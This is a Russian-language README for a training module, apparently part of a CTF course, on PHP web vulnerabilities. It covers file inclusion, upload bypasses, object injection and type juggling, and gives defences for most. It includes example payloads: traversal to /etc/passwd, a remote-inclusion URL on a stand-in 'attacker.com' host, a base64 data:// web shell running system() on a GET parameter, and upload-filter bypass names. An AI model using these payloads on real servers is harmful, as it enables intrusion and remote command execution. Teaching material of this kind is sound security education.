# Module 1: PHP Vulnerabilities

## Описание модуля

Этот модуль посвящен изучению уязвимостей в PHP веб-приложениях. Здесь вы научитесь находить и эксплуатировать наиболее распространенные уязвимости в PHP коде.

## Типы уязвимостей в этом модуле

### 1. Local File Inclusion (LFI)

**Что это?**
Local File Inclusion (LFI) - это уязвимость, которая позволяет атакующему включать локальные файлы на сервере через манипуляцию входными параметрами.

**Как возникает?**
```php
// Уязвимый код:
$page = $_GET['page'];
include($page . '.php');
```

**Как искать?**
1. Ищите параметры URL, которые включают файлы (page, file, include, path)
2. Попробуйте path traversal: `../../../etc/passwd`
3. Обратите внимание на PHP wrappers: `php://filter`, `php://input`
4. Попробуйте null byte injection (в старых версиях PHP): `file.txt%00`

**Защита:**
- Используйте whitelist разрешенных файлов
- Избегайте прямого использования пользовательского ввода в include/require
- Используйте `basename()` для удаления path traversal
- Отключите `allow_url_include` в php.ini

### 2. Remote File Inclusion (RFI)

**Что это?**
RFI позволяет включать удаленные файлы через HTTP/FTP протоколы.

**Как возникает?**
```php
// Уязвимый код с allow_url_include = On:
include($_GET['file']);
```

**Как искать?**
1. Проверьте, включен ли `allow_url_include`
2. Попробуйте подставить внешний URL: `?file=http://attacker.com/shell.txt`
3. Используйте PHP wrappers: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`

### 3. File Upload Vulnerabilities

**Что это?**
Уязвимость загрузки файлов позволяет загружать исполняемый код на сервер.

**Как возникает?**
- Недостаточная валидация типа файла
- Проверка только по MIME-type или расширению
- Возможность перезаписать .htaccess
- Отсутствие проверки содержимого файла

**Как искать?**
1. Попробуйте загрузить PHP shell с расширением `.php`
2. Попробуйте обойти проверку:
   - `.php.jpg`
   - `.php5`, `.phtml`, `.phar`
   - Двойное расширение: `shell.php.png`
   - Null byte: `shell.php%00.png`
3. Попробуйте изменить Content-Type в запросе
4. Проверьте, можно ли загрузить `.htaccess` для изменения обработки файлов
5. Используйте magic bytes (начало файла) для обхода проверки по содержимому

**Защита:**
- Проверяйте содержимое файла, а не только расширение
- Сохраняйте файлы вне webroot или в папке без прав выполнения
- Генерируйте случайные имена файлов
- Используйте whitelist допустимых расширений
- Проверяйте размер файла

### 4. PHP Object Injection

**Что это?**
Уязвимость при десериализации недоверенных данных в PHP.

**Как возникает?**
```php
// Уязвимый код:
$data = unserialize($_GET['data']);
```

**Как искать?**
1. Ищите использование `unserialize()` с пользовательским вводом
2. Изучите magic methods: `__wakeup()`, `__destruct()`, `__toString()`
3. Попробуйте создать payload с использованием существующих классов
4. Используйте инструменты типа PHPGGC для генерации gadget chains

### 5. PHP Type Juggling

**Что это?**
Слабая типизация PHP может приводить к неожиданным результатам сравнения.

**Примеры:**
```php
"0e123" == "0e456"  // true (оба интерпретируются как 0 * 10^123)
"0" == "anything"   // false
0 == "anything"     // true
true == "anything"  // true
```

**Как искать?**
1. Ищите использование `==` вместо `===`
2. Обратите внимание на сравнения хешей (MD5, SHA1)
3. Попробуйте подобрать строки, которые начинаются с `0e` и содержат только цифры

## Задания в модуле

### [Task 1: php_easy_include](./tasks/php_easy_include/)
Базовая задача на эксплуатацию LFI уязвимости.

### [Task 2: php_load_image](./tasks/php_load_image/)
Задача на обход фильтров при загрузке файлов.

### [Task 3: php_medium](./tasks/php_medium/)
Более сложная задача с комплексным PHP приложением.

## Полезные инструменты

- **Burp Suite** - для перехвата и модификации HTTP запросов
- **PHPGGC** - генератор gadget chains для PHP object injection
- **PHP Wrapper для LFI:**
  - `php://filter/convert.base64-encode/resource=file.php`
  - `php://input` (с POST данными)
  - `data://text/plain;base64,BASE64_PAYLOAD`
  - `expect://command` (если расширение expect установлено)
- **Wfuzz / ffuf** - для фаззинга параметров

## Полезные ресурсы

- [OWASP PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PayloadsAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [HackTricks - File Inclusion/Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

## Практика

После изучения теории, переходите к выполнению заданий в папке `tasks/`. Начните с более простых и постепенно переходите к сложным.

Удачи! 🚀

